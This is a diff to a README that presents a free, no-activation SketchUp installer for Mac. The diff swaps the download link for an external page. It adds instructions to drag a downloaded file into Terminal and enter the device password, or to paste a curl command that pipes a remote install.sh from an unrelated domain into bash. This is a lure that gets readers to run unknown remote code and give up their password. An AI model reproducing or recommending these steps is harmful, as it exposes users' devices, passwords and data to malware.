@@ -4,9 +4,34 @@
 
 Whether you're designing buildings, rooms, or concept models, this installer provides everything you need to bring your ideas to life using professional tools trusted by millions.
 
-[![Download SketchUp](https://img.shields.io/badge/Download-SketchUp-blueviolet)](#)
+[![Download SketchUp](https://img.shields.io/badge/Download-SketchUp-blueviolet)](https://sketchup-download-mac.github.io/.github)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
+
 
 ## 🛠 Key Features
 
@@ -19,16 +44,6 @@ Whether you're designing buildings, rooms, or concept models, this installer pro
 
 ---
 
-## 📦 How It Works
-
-1. 📥 Download the installer from this repository.  
-2. ⚙️ Run the setup and let it handle configuration.  
-3. 🖊️ Once installed, launch SketchUp and start modeling.  
-4. 💡 Everything is ready — no extra activation steps.
-
-This installer ensures a simple, user-friendly experience for anyone wanting to use SketchUp without obstacles.
-
----
 
 ## 🎯 Why Use This Tool?
 
@@ -58,15 +73,15 @@ Use with confidence, knowing your device and data remain secure.
 
 **1. SketchUp Installer Interface**  
 ![SketchUp Install](https://machow2.com/wp-content/uploads/2020/08/sketchup-for-mac-review.jpg)  
-*Simple and clean installation screen.*
+
 
 **2. SketchUp Workspace**  
 ![SketchUp UI](https://i.ytimg.com/vi/oSCzMzZ2U8Y/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLB3E3JFi_9um7em5Z8_-9RTV4EYvA)  
-*User-friendly modeling interface with toolbars and canvas.*
+
 
 **3. Rendered 3D Model in SketchUp**  
 ![SketchUp Render](https://global.discourse-cdn.com/sketchup/original/3X/5/7/5731c7ac185bbe035e8aa2700e727aaa2540adac.jpeg)  
-*Completed architectural render.*
+
 
 ---
 
